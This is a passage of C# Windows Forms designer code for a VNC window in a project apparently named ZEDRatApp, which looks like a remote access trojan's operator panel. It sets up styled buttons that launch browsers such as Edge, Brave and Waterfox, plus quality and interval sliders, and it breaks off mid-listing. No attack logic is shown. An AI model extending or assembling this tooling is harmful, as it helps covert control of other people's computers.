			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges21 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges22 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges23 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges24 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges25 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges26 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges27 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges28 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges29 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges30 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges31 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges32 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(ZEDRatApp.Forms.FrmVNC));
			this.bunifuFormDock1 = new Bunifu.UI.WinForms.BunifuFormDock();
			this.metroSetControlBox1 = new MetroSet_UI.Controls.MetroSetControlBox();
			this.bunifuSeparator5 = new Bunifu.UI.WinForms.BunifuSeparator();
			this.bunifuSeparator1 = new Bunifu.UI.WinForms.BunifuSeparator();
			this.bunifuSeparator2 = new Bunifu.UI.WinForms.BunifuSeparator();
			this.bunifuSeparator3 = new Bunifu.UI.WinForms.BunifuSeparator();
			this.bunifuIconButton3 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.bunifuIconButton4 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.bunifuIconButton5 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.bunifuIconButton6 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.bunifuIconButton7 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.bunifuIconButton8 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.bunifuIconButton9 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.bunifuIconButton10 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.bunifuIconButton11 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.bunifuIconButton12 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.bunifuIconButton13 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.bunifuIconButton14 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.bunifuIconButton15 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.bunifuIconButton16 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.bunifuIconButton17 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.bunifuIconButton18 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.bunifuIconButton19 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.bunifuIconButton20 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.bunifuIconButton21 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.bunifuIconButton1 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.ResizeScroll = new MetroSet_UI.Controls.MetroSetTrackBar();
			this.IntervalScroll = new MetroSet_UI.Controls.MetroSetTrackBar();
			this.QualityScroll = new MetroSet_UI.Controls.MetroSetTrackBar();
			this.bunifuIconButton27 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.bunifuIconButton26 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.bunifuIconButton25 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.bunifuIconButton24 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.bunifuIconButton23 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.bunifuIconButton22 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.MinBtn = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.RestoreMaxBtn = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.chkClone = new MetroSet_UI.Controls.MetroSetSwitch();
			this.CloseBtn = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.label1 = new System.Windows.Forms.Label();
			this.IntervalLabel = new System.Windows.Forms.Label();
			this.ResizeLabel = new System.Windows.Forms.Label();
			this.QualityLabel = new System.Windows.Forms.Label();
			this.timer1 = new System.Windows.Forms.Timer(this.components);
			this.timer2 = new System.Windows.Forms.Timer(this.components);
			this.statusStrip1 = new System.Windows.Forms.StatusStrip();
			this.toolStripStatusLabel3 = new System.Windows.Forms.ToolStripStatusLabel();
			this.PingStatusLabel = new System.Windows.Forms.ToolStripStatusLabel();
			this.VNCBox = new System.Windows.Forms.PictureBox();
			this.chkStartStop = new MetroSet_UI.Controls.MetroSetSwitch();
			this.bunifuIconButton2 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(this.components);
			this.bunifuIconButton28 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.bunifuToolTip1 = new Bunifu.UI.WinForms.BunifuToolTip(this.components);
			this.bunifuIconButton29 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.statusStrip1.SuspendLayout();
			((System.ComponentModel.ISupportInitialize)this.VNCBox).BeginInit();
			base.SuspendLayout();
			this.bunifuFormDock1.AllowFormDragging = true;
			this.bunifuFormDock1.AllowFormDropShadow = true;
			this.bunifuFormDock1.AllowFormResizing = true;
			this.bunifuFormDock1.AllowHidingBottomRegion = true;
			this.bunifuFormDock1.AllowOpacityChangesWhileDragging = false;
			this.bunifuFormDock1.BorderOptions.BottomBorder.BorderColor = System.Drawing.Color.Silver;
			this.bunifuFormDock1.BorderOptions.BottomBorder.BorderThickness = 1;
			this.bunifuFormDock1.BorderOptions.BottomBorder.ShowBorder = true;
			this.bunifuFormDock1.BorderOptions.LeftBorder.BorderColor = System.Drawing.Color.Silver;
			this.bunifuFormDock1.BorderOptions.LeftBorder.BorderThickness = 1;
			this.bunifuFormDock1.BorderOptions.LeftBorder.ShowBorder = true;
			this.bunifuFormDock1.BorderOptions.RightBorder.BorderColor = System.Drawing.Color.Silver;
			this.bunifuFormDock1.BorderOptions.RightBorder.BorderThickness = 1;
			this.bunifuFormDock1.BorderOptions.RightBorder.ShowBorder = true;
			this.bunifuFormDock1.BorderOptions.TopBorder.BorderColor = System.Drawing.Color.Silver;
			this.bunifuFormDock1.BorderOptions.TopBorder.BorderThickness = 1;
			this.bunifuFormDock1.BorderOptions.TopBorder.ShowBorder = true;
			this.bunifuFormDock1.ContainerControl = this;
			this.bunifuFormDock1.DockingIndicatorsColor = System.Drawing.Color.FromArgb(202, 215, 233);
			this.bunifuFormDock1.DockingIndicatorsOpacity = 0.5;
			this.bunifuFormDock1.DockingOptions.DockAll = true;
			this.bunifuFormDock1.DockingOptions.DockBottomLeft = true;
			this.bunifuFormDock1.DockingOptions.DockBottomRight = true;
			this.bunifuFormDock1.DockingOptions.DockFullScreen = true;
			this.bunifuFormDock1.DockingOptions.DockLeft = true;
			this.bunifuFormDock1.DockingOptions.DockRight = true;
			this.bunifuFormDock1.DockingOptions.DockTopLeft = true;
			this.bunifuFormDock1.DockingOptions.DockTopRight = true;
			this.bunifuFormDock1.FormDraggingOpacity = 0.9;
			this.bunifuFormDock1.ParentForm = this;
			this.bunifuFormDock1.ShowCursorChanges = true;
			this.bunifuFormDock1.ShowDockingIndicators = true;
			this.bunifuFormDock1.TitleBarOptions.AllowFormDragging = true;
			this.bunifuFormDock1.TitleBarOptions.BunifuFormDock = this.bunifuFormDock1;
			this.bunifuFormDock1.TitleBarOptions.DoubleClickToExpandWindow = true;
			this.bunifuFormDock1.TitleBarOptions.TitleBarControl = null;
			this.bunifuFormDock1.TitleBarOptions.UseBackColorOnDockingIndicators = false;
			this.metroSetControlBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			this.metroSetControlBox1.CloseHoverBackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.metroSetControlBox1.CloseHoverForeColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.metroSetControlBox1.CloseNormalForeColor = System.Drawing.Color.WhiteSmoke;
			this.metroSetControlBox1.DisabledForeColor = System.Drawing.Color.WhiteSmoke;
			this.metroSetControlBox1.IsDerivedStyle = true;
			this.metroSetControlBox1.Location = new System.Drawing.Point(1145, 3);
			this.metroSetControlBox1.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
			this.metroSetControlBox1.MaximizeBox = true;
			this.metroSetControlBox1.MaximizeHoverBackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.metroSetControlBox1.MaximizeHoverForeColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.metroSetControlBox1.MaximizeNormalForeColor = System.Drawing.Color.WhiteSmoke;
			this.metroSetControlBox1.MinimizeBox = true;
			this.metroSetControlBox1.MinimizeHoverBackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.metroSetControlBox1.MinimizeHoverForeColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.metroSetControlBox1.MinimizeNormalForeColor = System.Drawing.Color.WhiteSmoke;
			this.metroSetControlBox1.Name = "metroSetControlBox1";
			this.metroSetControlBox1.Size = new System.Drawing.Size(100, 25);
			this.metroSetControlBox1.Style = MetroSet_UI.Enums.Style.Custom;
			this.metroSetControlBox1.StyleManager = null;
			this.metroSetControlBox1.TabIndex = 218;
			this.metroSetControlBox1.Text = "metroSetControlBox1";
			this.metroSetControlBox1.ThemeAuthor = "Narwin";
			this.metroSetControlBox1.ThemeName = "MetroLite";
			this.bunifuToolTip1.SetToolTip(this.metroSetControlBox1, "");
			this.bunifuToolTip1.SetToolTipIcon(this.metroSetControlBox1, null);
			this.bunifuToolTip1.SetToolTipTitle(this.metroSetControlBox1, "");
			this.bunifuSeparator5.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			this.bunifuSeparator5.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator5.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator5.BackgroundImage");
			this.bunifuSeparator5.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator5.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuSeparator5.LineColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuSeparator5.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.Solid;
			this.bunifuSeparator5.LineThickness = 1;
			this.bunifuSeparator5.Location = new System.Drawing.Point(0, -5);
			this.bunifuSeparator5.Margin = new System.Windows.Forms.Padding(7, 18, 7, 18);
			this.bunifuSeparator5.Name = "bunifuSeparator5";
			this.bunifuSeparator5.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Horizontal;
			this.bunifuSeparator5.Size = new System.Drawing.Size(1248, 10);
			this.bunifuSeparator5.TabIndex = 255;
			this.bunifuToolTip1.SetToolTip(this.bunifuSeparator5, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuSeparator5, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuSeparator5, "");
			this.bunifuSeparator1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			this.bunifuSeparator1.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator1.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator1.BackgroundImage");
			this.bunifuSeparator1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator1.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuSeparator1.LineColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuSeparator1.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.Solid;
			this.bunifuSeparator1.LineThickness = 1;
			this.bunifuSeparator1.Location = new System.Drawing.Point(0, 672);
			this.bunifuSeparator1.Margin = new System.Windows.Forms.Padding(12, 29, 12, 29);
			this.bunifuSeparator1.Name = "bunifuSeparator1";
			this.bunifuSeparator1.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Horizontal;
			this.bunifuSeparator1.Size = new System.Drawing.Size(1248, 16);
			this.bunifuSeparator1.TabIndex = 256;
			this.bunifuToolTip1.SetToolTip(this.bunifuSeparator1, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuSeparator1, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuSeparator1, "");
			this.bunifuSeparator2.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			this.bunifuSeparator2.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator2.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator2.BackgroundImage");
			this.bunifuSeparator2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator2.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuSeparator2.LineColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuSeparator2.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.Solid;
			this.bunifuSeparator2.LineThickness = 1;
			this.bunifuSeparator2.Location = new System.Drawing.Point(-5, 1);
			this.bunifuSeparator2.Margin = new System.Windows.Forms.Padding(12, 29, 12, 29);
			this.bunifuSeparator2.Name = "bunifuSeparator2";
			this.bunifuSeparator2.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Vertical;
			this.bunifuSeparator2.Size = new System.Drawing.Size(10, 679);
			this.bunifuSeparator2.TabIndex = 257;
			this.bunifuToolTip1.SetToolTip(this.bunifuSeparator2, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuSeparator2, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuSeparator2, "");
			this.bunifuSeparator3.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			this.bunifuSeparator3.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator3.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator3.BackgroundImage");
			this.bunifuSeparator3.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator3.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuSeparator3.LineColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuSeparator3.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.Solid;
			this.bunifuSeparator3.LineThickness = 1;
			this.bunifuSeparator3.Location = new System.Drawing.Point(1242, 1);
			this.bunifuSeparator3.Margin = new System.Windows.Forms.Padding(20, 47, 20, 47);
			this.bunifuSeparator3.Name = "bunifuSeparator3";
			this.bunifuSeparator3.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Vertical;
			this.bunifuSeparator3.Size = new System.Drawing.Size(10, 679);
			this.bunifuSeparator3.TabIndex = 258;
			this.bunifuToolTip1.SetToolTip(this.bunifuSeparator3, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuSeparator3, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuSeparator3, "");
			this.bunifuIconButton3.AllowAnimations = true;
			this.bunifuIconButton3.AllowBorderColorChanges = true;
			this.bunifuIconButton3.AllowMouseEffects = true;
			this.bunifuIconButton3.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
			this.bunifuIconButton3.AnimationSpeed = 200;
			this.bunifuIconButton3.BackColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton3.BackgroundColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton3.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuIconButton3.BorderRadius = 1;
			this.bunifuIconButton3.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.bunifuIconButton3.BorderThickness = 1;
			this.bunifuIconButton3.ColorContrastOnClick = 30;
			this.bunifuIconButton3.ColorContrastOnHover = 30;
			this.bunifuIconButton3.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges.BottomLeft = true;
			borderEdges.BottomRight = true;
			borderEdges.TopLeft = true;
			borderEdges.TopRight = true;
			this.bunifuIconButton3.CustomizableEdges = borderEdges;
			this.bunifuIconButton3.DialogResult = System.Windows.Forms.DialogResult.None;
			this.bunifuIconButton3.Image = (System.Drawing.Image)resources.GetObject("bunifuIconButton3.Image");
			this.bunifuIconButton3.ImageMargin = new System.Windows.Forms.Padding(0);
			this.bunifuIconButton3.Location = new System.Drawing.Point(105, 618);
			this.bunifuIconButton3.Name = "bunifuIconButton3";
			this.bunifuIconButton3.RoundBorders = false;
			this.bunifuIconButton3.ShowBorders = true;
			this.bunifuIconButton3.Size = new System.Drawing.Size(52, 51);
			this.bunifuIconButton3.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.bunifuIconButton3.TabIndex = 259;
			this.bunifuToolTip1.SetToolTip(this.bunifuIconButton3, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuIconButton3, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuIconButton3, "");
			this.bunifuIconButton3.Click += new System.EventHandler(edgeToolStripMenuItem_Click);
			this.bunifuIconButton4.AllowAnimations = true;
			this.bunifuIconButton4.AllowBorderColorChanges = true;
			this.bunifuIconButton4.AllowMouseEffects = true;
			this.bunifuIconButton4.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
			this.bunifuIconButton4.AnimationSpeed = 200;
			this.bunifuIconButton4.BackColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton4.BackgroundColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton4.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuIconButton4.BorderRadius = 1;
			this.bunifuIconButton4.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.bunifuIconButton4.BorderThickness = 1;
			this.bunifuIconButton4.ColorContrastOnClick = 30;
			this.bunifuIconButton4.ColorContrastOnHover = 30;
			this.bunifuIconButton4.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges2.BottomLeft = true;
			borderEdges2.BottomRight = true;
			borderEdges2.TopLeft = true;
			borderEdges2.TopRight = true;
			this.bunifuIconButton4.CustomizableEdges = borderEdges2;
			this.bunifuIconButton4.DialogResult = System.Windows.Forms.DialogResult.None;
			this.bunifuIconButton4.Image = (System.Drawing.Image)resources.GetObject("bunifuIconButton4.Image");
			this.bunifuIconButton4.ImageMargin = new System.Windows.Forms.Padding(0);
			this.bunifuIconButton4.Location = new System.Drawing.Point(163, 618);
			this.bunifuIconButton4.Name = "bunifuIconButton4";
			this.bunifuIconButton4.RoundBorders = false;
			this.bunifuIconButton4.ShowBorders = true;
			this.bunifuIconButton4.Size = new System.Drawing.Size(52, 51);
			this.bunifuIconButton4.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.bunifuIconButton4.TabIndex = 260;
			this.bunifuToolTip1.SetToolTip(this.bunifuIconButton4, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuIconButton4, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuIconButton4, "");
			this.bunifuIconButton4.Click += new System.EventHandler(btnCocCoc_Click);
			this.bunifuIconButton5.AllowAnimations = true;
			this.bunifuIconButton5.AllowBorderColorChanges = true;
			this.bunifuIconButton5.AllowMouseEffects = true;
			this.bunifuIconButton5.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
			this.bunifuIconButton5.AnimationSpeed = 200;
			this.bunifuIconButton5.BackColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton5.BackgroundColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton5.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuIconButton5.BorderRadius = 1;
			this.bunifuIconButton5.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.bunifuIconButton5.BorderThickness = 1;
			this.bunifuIconButton5.ColorContrastOnClick = 30;
			this.bunifuIconButton5.ColorContrastOnHover = 30;
			this.bunifuIconButton5.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges3.BottomLeft = true;
			borderEdges3.BottomRight = true;
			borderEdges3.TopLeft = true;
			borderEdges3.TopRight = true;
			this.bunifuIconButton5.CustomizableEdges = borderEdges3;
			this.bunifuIconButton5.DialogResult = System.Windows.Forms.DialogResult.None;
			this.bunifuIconButton5.Image = (System.Drawing.Image)resources.GetObject("bunifuIconButton5.Image");
			this.bunifuIconButton5.ImageMargin = new System.Windows.Forms.Padding(0);
			this.bunifuIconButton5.Location = new System.Drawing.Point(221, 618);
			this.bunifuIconButton5.Name = "bunifuIconButton5";
			this.bunifuIconButton5.RoundBorders = false;
			this.bunifuIconButton5.ShowBorders = true;
			this.bunifuIconButton5.Size = new System.Drawing.Size(52, 51);
			this.bunifuIconButton5.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.bunifuIconButton5.TabIndex = 261;
			this.bunifuToolTip1.SetToolTip(this.bunifuIconButton5, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuIconButton5, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuIconButton5, "");
			this.bunifuIconButton5.Click += new System.EventHandler(btnSlimjet_Click);
			this.bunifuIconButton6.AllowAnimations = true;
			this.bunifuIconButton6.AllowBorderColorChanges = true;
			this.bunifuIconButton6.AllowMouseEffects = true;
			this.bunifuIconButton6.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
			this.bunifuIconButton6.AnimationSpeed = 200;
			this.bunifuIconButton6.BackColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton6.BackgroundColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton6.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuIconButton6.BorderRadius = 1;
			this.bunifuIconButton6.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.bunifuIconButton6.BorderThickness = 1;
			this.bunifuIconButton6.ColorContrastOnClick = 30;
			this.bunifuIconButton6.ColorContrastOnHover = 30;
			this.bunifuIconButton6.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges4.BottomLeft = true;
			borderEdges4.BottomRight = true;
			borderEdges4.TopLeft = true;
			borderEdges4.TopRight = true;
			this.bunifuIconButton6.CustomizableEdges = borderEdges4;
			this.bunifuIconButton6.DialogResult = System.Windows.Forms.DialogResult.None;
			this.bunifuIconButton6.Image = (System.Drawing.Image)resources.GetObject("bunifuIconButton6.Image");
			this.bunifuIconButton6.ImageMargin = new System.Windows.Forms.Padding(0);
			this.bunifuIconButton6.Location = new System.Drawing.Point(279, 618);
			this.bunifuIconButton6.Name = "bunifuIconButton6";
			this.bunifuIconButton6.RoundBorders = false;
			this.bunifuIconButton6.ShowBorders = true;
			this.bunifuIconButton6.Size = new System.Drawing.Size(52, 51);
			this.bunifuIconButton6.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.bunifuIconButton6.TabIndex = 262;
			this.bunifuToolTip1.SetToolTip(this.bunifuIconButton6, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuIconButton6, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuIconButton6, "");
			this.bunifuIconButton6.Click += new System.EventHandler(btnAtomBrowser_Click);
			this.bunifuIconButton7.AllowAnimations = true;
			this.bunifuIconButton7.AllowBorderColorChanges = true;
			this.bunifuIconButton7.AllowMouseEffects = true;
			this.bunifuIconButton7.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
			this.bunifuIconButton7.AnimationSpeed = 200;
			this.bunifuIconButton7.BackColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton7.BackgroundColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton7.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuIconButton7.BorderRadius = 1;
			this.bunifuIconButton7.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.bunifuIconButton7.BorderThickness = 1;
			this.bunifuIconButton7.ColorContrastOnClick = 30;
			this.bunifuIconButton7.ColorContrastOnHover = 30;
			this.bunifuIconButton7.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges5.BottomLeft = true;
			borderEdges5.BottomRight = true;
			borderEdges5.TopLeft = true;
			borderEdges5.TopRight = true;
			this.bunifuIconButton7.CustomizableEdges = borderEdges5;
			this.bunifuIconButton7.DialogResult = System.Windows.Forms.DialogResult.None;
			this.bunifuIconButton7.Image = (System.Drawing.Image)resources.GetObject("bunifuIconButton7.Image");
			this.bunifuIconButton7.ImageMargin = new System.Windows.Forms.Padding(0);
			this.bunifuIconButton7.Location = new System.Drawing.Point(337, 618);
			this.bunifuIconButton7.Name = "bunifuIconButton7";
			this.bunifuIconButton7.RoundBorders = false;
			this.bunifuIconButton7.ShowBorders = true;
			this.bunifuIconButton7.Size = new System.Drawing.Size(52, 51);
			this.bunifuIconButton7.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.bunifuIconButton7.TabIndex = 263;
			this.bunifuToolTip1.SetToolTip(this.bunifuIconButton7, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuIconButton7, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuIconButton7, "");
			this.bunifuIconButton7.Click += new System.EventHandler(braveToolStripMenuItem_Click);
			this.bunifuIconButton8.AllowAnimations = true;
			this.bunifuIconButton8.AllowBorderColorChanges = true;
			this.bunifuIconButton8.AllowMouseEffects = true;
			this.bunifuIconButton8.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
			this.bunifuIconButton8.AnimationSpeed = 200;
			this.bunifuIconButton8.BackColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton8.BackgroundColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton8.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuIconButton8.BorderRadius = 1;
			this.bunifuIconButton8.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.bunifuIconButton8.BorderThickness = 1;
			this.bunifuIconButton8.ColorContrastOnClick = 30;
			this.bunifuIconButton8.ColorContrastOnHover = 30;
			this.bunifuIconButton8.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges6.BottomLeft = true;
			borderEdges6.BottomRight = true;
			borderEdges6.TopLeft = true;
			borderEdges6.TopRight = true;
			this.bunifuIconButton8.CustomizableEdges = borderEdges6;
			this.bunifuIconButton8.DialogResult = System.Windows.Forms.DialogResult.None;
			this.bunifuIconButton8.Image = (System.Drawing.Image)resources.GetObject("bunifuIconButton8.Image");
			this.bunifuIconButton8.ImageMargin = new System.Windows.Forms.Padding(0);
			this.bunifuIconButton8.Location = new System.Drawing.Point(395, 618);
			this.bunifuIconButton8.Name = "bunifuIconButton8";
			this.bunifuIconButton8.RoundBorders = false;
			this.bunifuIconButton8.ShowBorders = true;
			this.bunifuIconButton8.Size = new System.Drawing.Size(52, 51);
			this.bunifuIconButton8.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.bunifuIconButton8.TabIndex = 264;
			this.bunifuToolTip1.SetToolTip(this.bunifuIconButton8, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuIconButton8, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuIconButton8, "");
			this.bunifuIconButton8.Click += new System.EventHandler(btnWaterfox_Click);
			this.bunifuIconButton9.AllowAnimations = true;
			this.bunifuIconButton9.AllowBorderColorChanges = true;
